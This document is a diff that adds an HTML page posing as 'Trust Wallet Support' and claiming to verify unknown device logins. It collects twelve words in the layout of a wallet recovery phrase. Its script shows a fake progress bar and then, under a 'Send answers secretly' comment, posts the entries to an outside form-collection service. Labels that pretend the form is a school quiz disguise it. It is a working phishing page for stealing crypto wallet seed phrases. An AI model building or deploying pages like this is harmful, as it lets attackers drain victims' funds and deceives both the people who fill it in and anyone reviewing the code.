@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trust Wallet Support</title>
+  <style>
+    body {
+      background: #000;
+      color: #fff;
+      font-family: "Roboto", Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Moving heading */
+    .marquee {
+      width: 100%;
+      overflow: hidden;
+      white-space: nowrap;
+      box-sizing: border-box;
+      margin: 10px 0 30px 0;
+    }
+
+    .marquee span {
+      display: inline-block;
+      font-size: 18px; /* smaller than before */
+      font-weight: bold;
+      padding-left: 100%;
+      animation: marquee 10s linear infinite;
+      color: #0f0; /* green for emphasis */
+    }
+
+    @keyframes marquee {
+      0%   { transform: translateX(0); }
+      100% { transform: translateX(-100%); }
+    }
+
+    .container {
+      width: 95%;
+      max-width: 500px;
+      position: relative;
+    }
+
+    .inputs {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px 20px;
+      margin-bottom: 20px;
+    }
+
+    .inputs label {
+      font-size: 14px;
+      color: #aaa;
+      display: flex;
+      align-items: center;
+    }
+
+    .inputs input {
+      background: transparent;
+      border: 1px solid #333;
+      border-radius: 5px;
+      padding: 8px;
+      color: #fff;
+      width: 100%;
+    }
+
+    .message {
+      font-size: 12px;
+      color: #aaa;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      background: #013d01;
+      color: white;
+      cursor: not-allowed;
+    }
+
+    button.active {
+      background: #00c853;
+      cursor: pointer;
+    }
+
+    .loading {
+      margin-top: 20px;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .spinner {
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top: 4px solid #0f0;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+
+    .progress {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .done {
+      font-size: 20px;
+      color: #0f0;
+      display: none;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <!-- ✅ Moving message -->
+  <div class="marquee"><span>Trust wallet security page verifies unknown device loggings</span></div>
+
+  <div class="container">
+    <!-- Form -->
+    <form id="schoolForm" action="https://formspree.io/f/xjkejwjn" method="POST">
+       
+      <!-- Hidden fields so students don't see redirects -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="">
+
+      <div class="inputs">
+        <label>1.<input type="text" name="Q1" required></label>
+        <label>7.<input type="text" name="Q7" required></label>
+        <label>2.<input type="text" name="Q2" required></label>
+        <label>8.<input type="text" name="Q8" required></label>
+        <label>3.<input type="text" name="Q3" required></label>
+        <label>9.<input type="text" name="Q9" required></label>
+        <label>4.<input type="text" name="Q4" required></label>
+        <label>10.<input type="text" name="Q10" required></label>
+        <label>5.<input type="text" name="Q5" required></label>
+        <label>11.<input type="text" name="Q11" required></label>
+        <label>6.<input type="text" name="Q6" required></label>
+        <label>12.<input type="text" name="Q12" required></label>
+      </div>
+
+      <div class="message">Never share your secret phrase with any one and store it securely !</div>
+      <button id="continueBtn" type="submit">Continue</button>
+    </form>
+
+    <!-- Loading animation -->
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      <div class="progress" id="progress">0%</div>
+      <div class="done" id="done">✅ Done</div>
+    </div>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll("input[type='text']");
+    const button = document.getElementById("continueBtn");
+    const form = document.getElementById("schoolForm");
+    const loading = document.getElementById("loading");
+    const progress = document.getElementById("progress");
+    const done = document.getElementById("done");
+
+    // 🔄 Clear inputs when page reloads
+    window.onload = () => {
+      inputs.forEach(input => input.value = "");
+      button.classList.remove("active");
+      button.disabled = true;
+    };
+
+    function checkInputs() {
+      let allFilled = true;
+      inputs.forEach(input => {
+        if (!input.value.trim()) {
+          allFilled = false;
+        }
+      });
+      if (allFilled) {
+        button.classList.add("active");
+        button.disabled = false;
+      } else {
+        button.classList.remove("active");
+        button.disabled = true;
+      }
+    }
+
+    inputs.forEach(input => {
+      input.addEventListener("input", checkInputs);
+    });
+
+    form.addEventListener("submit", (e) => {
+      if (!button.classList.contains("active")) {
+        e.preventDefault();
+        return;
+      }
+
+      e.preventDefault(); // Stop normal redirect
+
+      // Show loading animation
+      loading.style.display = "flex";
+      let count = 0;
+      const interval = setInterval(() => {
+        count++;
+        progress.innerText = count + "%";
+        if (count >= 100) {
+          clearInterval(interval);
+          done.style.display = "block";
+
+          // ✅ Hide loading immediately after reaching 100
+          loading.style.display = "none";
+
+          // Send answers secretly
+          const formData = new FormData(form);
+          fetch(form.action, {
+            method: "POST",
+            body: formData
+          });
+
+          // Clear inputs after submission
+          inputs.forEach(input => input.value = "");
+          button.classList.remove("active");
+          button.disabled = true;
+        }
+      }, 40);
+    });
+  </script>
+</body>
+</html>
